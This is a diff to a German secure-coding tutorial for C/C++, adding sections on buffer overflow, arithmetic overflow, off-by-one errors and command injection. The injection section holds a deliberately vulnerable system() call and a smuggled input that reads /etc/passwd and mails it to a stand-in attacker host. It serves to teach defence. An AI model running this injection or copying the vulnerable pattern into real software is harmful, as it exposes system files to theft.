@@ -15,7 +15,14 @@
   * [Typensicherheit: Datentypen sind unsere Freunde](#link)
   * [Erster Tipp für Pufferüberlauf: Exaktes Arbeiten](#link)
   * [Zweiter Tipp für Pufferüberlauf: Verwende ausschließlich &bdquo;*secure*&rdquo; Funktionen](#link)
-  * [Ein Tipp für arithmetischen Überlauf: `std::midpoint`](#link)
+  
+     * [Drei Tipps für arithmetischen Überlauf](#link)
+    
+      * [Ein weiterer Tipp für arithmetischen Überlauf: `std::midpoint`](#link)
+  
+  * [Verhindere ungültige Zeichenketteninjektionen (so genannte *SQL Injections*)](#link)
+  * [Vermeide &bdquo;*Off-by-One*&rdquo; Fehler!](#link)
+
   * [Verwende STL-Algorithmen](#link)
   * [Verwende STL-Container](#link)
   * [Achte auf sicheres *Downcasting*](#link)
@@ -146,6 +153,76 @@ Eine Stärke der beiden Programmiersprachen C/C++ ist, dass beide das Konzept von
 
 ## Erster Tipp für Pufferüberlauf: Exaktes Arbeiten
 
+Wir betrachten diese &ndash; leicht ironische, aber dennoch ernst gemeinte &ndash; Aussage
+an einem Beispiel:
+
+*Beispiel*: Einlesen der Kommandozeile - keine optimale Lösung
+
+```cpp
+01: void test(int argc, const char* argv[])
+02: {
+03:     char cmdLine[4096];
+04: 
+05:     cmdLine[0] = '\0';
+06: 
+07:     for (int i = 1; i < argc; ++i) {
+08:         strcat(cmdLine, argv[i]);
+09:         strcat(cmdLine, " ");
+10:     }
+11: 
+12:     std::println("cmdLine: >{}<", cmdLine);
+13: }
+```
+
+*Beispiel*: Einlesen der Kommandozeile - bessere Lösung
+
+```cpp
+01: void evaluateArgs(int argc, const char* argv[])
+02: {
+03:     size_t bufsize = 0;
+04:     size_t buflen = 0;
+05: 
+06:     char* cmdLine = NULL;
+07: 
+08:     for (int i = 1; i < argc; ++i) {
+09: 
+10:         const size_t len = strlen(argv[i]);
+11: 
+12:         if (bufsize - buflen <= len) {
+13: 
+14:             bufsize = (bufsize + len) * 2;
+15: 
+16:             char* ptr = (char*)realloc(cmdLine, bufsize);
+17:             if (ptr == NULL) {
+18:                 free(cmdLine);
+19:                 exit(-1);
+20:             }
+21: 
+22:             cmdLine = ptr;
+23:         }
+24: 
+25:         memcpy(cmdLine + buflen, argv[i], len);
+26:         buflen += len;
+27:         cmdLine[buflen++] = ' ';
+28:     }
+29: 
+30:     if (cmdLine != NULL) {
+31:         cmdLine[buflen] = '\0';
+32:     }
+33: 
+34:     // print created buffer 'cmdLine'
+35:     std::println("cmdLine: >{}<", cmdLine);
+36: 
+37:     free(cmdLine);
+38: }
+```
+
+*Ausgabe*:
+
+```
+cmdLine: >one two three four <
+```
+
 
 ---
 
@@ -154,7 +231,7 @@ Eine Stärke der beiden Programmiersprachen C/C++ ist, dass beide das Konzept von
 *Beispiel*: `strncpy_s`
 
 ```cpp
-01: static void test_take_care_of_buffer_overflow_01() {
+01: void test() {
 02: 
 03:     char buffer[16];
 04: 
@@ -182,7 +259,7 @@ Destination: >This is way too<
 *Beispiel*: `snprintf`
 
 ```cpp
-01: static void test_take_care_of_buffer_overflow_02() {
+01: void test() {
 02: 
 03:     constexpr int Size = 64;
 04: 
@@ -221,7 +298,7 @@ Die Menge aller Modifikationen an den ursprünglichen Funktionen ist hier beschri
 
 ---
 
-## Ein Tipp für arithmetischen Überlauf: `std::midpoint`
+## Ein weiterer Tipp für arithmetischen Überlauf: `std::midpoint`
 
 Die Funktion `std::midpoint()` berechnet den Mittelpunkt von zwei ganzen Zahlen
 oder zwei Gleitkommazahlen:
@@ -250,6 +327,136 @@ b:                                 4294967293
 Incorrect (overflow and wrapping): 2147483646
 Correct:                           4294967294
 ```
+
+---
+
+## Verhindere ungültige Zeichenketteninjektionen (so genannte *SQL Injections*)
+
+Das Durchreichen von Zeichenketten an Subsysteme ist mit äußerster Vorsicht zu bewerkstelligen.
+
+So genannte *SQL-Injections*-Angriffe sind eine der ältesten Schwachstellen in derartigen Programmen.
+
+Eine SQL-Injection ist eine Art von Sicherheitslücke,
+bei der ein Angreifer einen Teil des SQL-Codes (*Structured Query Language*) verwendet,
+um eine Datenbank zu manipulieren und um Zugriff auf potenziell wertvolle Informationen zu erhalten.
+Dies ist eine der häufigsten und bedrohlichsten Angriffsarten, da sie potenziell gegen jedes Programm oder jede Webseite eingesetzt werden kann.
+
+Neben SQL-Inkektionen kann die Zeichenkette auch ein (Unix/Linux)-Shell-Kommando darstellen,
+was an dieser Stelle ebenfalls einen Angriff darstellt.
+
+*Beispiel*:
+
+```cpp
+01: void do_injection(const char* addr) {
+02: 
+03:     char buffer[256];
+04: 
+05:     sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
+06:     system(buffer);
+07: }
+08: 
+09: void test() {
+10:     do_injection("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
+11: }
+```
+
+*Ausgabe*:
+
+```
+Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.net < /tmp/email
+```
+
+*Lösung*:
+
+Jegliche Form eine Benutzereingabe ist zu validieren.
+
+In diesem Zusammenhang gibt es den Begriff der &bdquo;Whitelist&rdquo;:
+Hierunter versteht man eine Art  &bdquo;weiße Liste&rdquo;, eine Art Filter dar,
+der die sicheren Daten beschreibt und filtert.
+
+*Beispiel*:
+
+```cpp
+01: void clean_input(char* input) {
+02: 
+03:     static char ok_chars[] =
+04:         "abcdefghijklmnopqrstuvwxyz"
+05:         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+06:         "1234567890_-@";
+07: 
+08:     char* begin = input;
+09:     char* end = input + strlen(input);
+10: 
+11:     begin += strspn(begin, ok_chars);
+12: 
+13:     while (begin != end) {
+14:         *begin = '_';
+15:         begin += strspn(begin, ok_chars);
+16: 
+17:     }
+18: }
+19: 
+20: void do_injection_safe(const char* addr) {
+21: 
+22:     char buffer[256];
+23: 
+24:     sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
+25:     std::println("Buffer (Input):   {}", buffer);
+26: 
+27:     clean_input(buffer);
+28:     std::println("Buffer (Cleaned): {}", buffer);
+29: 
+30:     system(buffer);
+31: }
+32: 
+33: void test() {
+34:     do_injection_safe("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
+35: }
+```
+
+Die so genannte  &bdquo;Whitelist&rdquo; finden wir in dem Programmausschnitt
+in den Zeilen 4 bis 6 vor: Eine Menge aller zulässigen Zeichen in diesem Beispiel.
+
+*Ausgabe*:
+
+```
+Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.net < /tmp/email
+Buffer (Cleaned): _bin_mail_bogus@addr_com__cat__etc_passwd___mail_somebadguy_net____tmp_email
+```
+
+
+---
+
+## Vermeide &bdquo;*Off-by-One*&rdquo; Fehler!
+
+Vermeiden Sie &bdquo;*Off-by-One*&rdquo; Fehler!
+Natürlich ist das leichter getan als gesagt. 
+
+Eine Option besteht &ndash; wenn gleich das für das gesamte Spektrum der Entwicklung von Software gilt &ndash; darin,
+jede Zeile des Quellcodes mit dem Debugger zu durchlaufen!
+
+
+*Frage*: Wieviele &bdquo;*Off-by-One*&rdquo; Fehler entdecken Sie in diesem Codefragment:
+
+```cpp
+01: void test() {
+02: 
+03:     char source[10];
+04:     strcpy(source, "0123456789");
+05: 
+06:     char* dest = (char*)malloc(strlen(source));
+07:             
+08:     int i;
+09:     for (i = 1; i <= 11; i++)
+10:     {
+11:         dest[i] = source[i];
+12:     }
+13:     dest[i] = '\0';
+14: 
+15:     std::println("Dest: {}", dest);
+16: }
+```
+
 
 ---
 
@@ -453,7 +660,7 @@ Es gibt die eine oder andere Möglichkeit, Werte mit einer Semantik zu verbinden:
 16:     Brown
 17: };
 18: 
-19: static void test_use_class_enums() {
+19: void test() {
 20: 
 21:     std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Green) << std::endl;
 22:     std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Orange) << std::endl;
@@ -528,11 +735,11 @@ Dazu bedarf es der Implementierung des so genannten *Literal*-Operators:
 16:     explicit Days(unsigned long long hours) : m_hours(hours) {}
 17: };
 18: 
-19: static Hours operator"" _hours(unsigned long long hours) {
+19: Hours operator"" _hours(unsigned long long hours) {
 20:     return Hours{ hours };
 21: }
 22: 
-23: static Days operator"" _days(unsigned long long hours) {
+23: Days operator"" _days(unsigned long long hours) {
 24:     return Days{ hours };
 25: }
 ```
@@ -547,15 +754,15 @@ Man muss in diesem Fall die *Literal*-Operatoren nur anders definieren:
 ```cpp
 01: using hours = unsigned long long;
 02: 
-03: static constexpr hours operator"" _hours(unsigned long long hours) {
+03: constexpr hours operator"" _hours(unsigned long long hours) {
 04:     return hours;
 05: }
 06: 
-07: static constexpr hours operator"" _days(unsigned long long hours) {
+07: constexpr hours operator"" _days(unsigned long long hours) {
 08:     return hours * 24;
 09: }
 10: 
-11: static constexpr hours operator"" _weeks(unsigned long long hours) {
+11: constexpr hours operator"" _weeks(unsigned long long hours) {
 12:     return hours * 7 * 24;
 13: }
 14: 
@@ -593,7 +800,7 @@ Man muss in diesem Fall die *Literal*-Operatoren nur anders definieren:
 12:     }
 13: };
 14: 
-15: static void test_use_override() {
+15: void test() {
 16:     Button button;
 17:     button.onClick();
 18: 
@@ -701,7 +908,7 @@ Die Annotation `[[nodiscard]]` hilft Programmierern, die mit Ihrem Code interagi
 15:     }
 16: };
 17: 
-18: static void test_use_const() {
+18: void test() {
 19:     Point point;
 20:     point.is_valid();     // warning: ignoring return value
 21: }
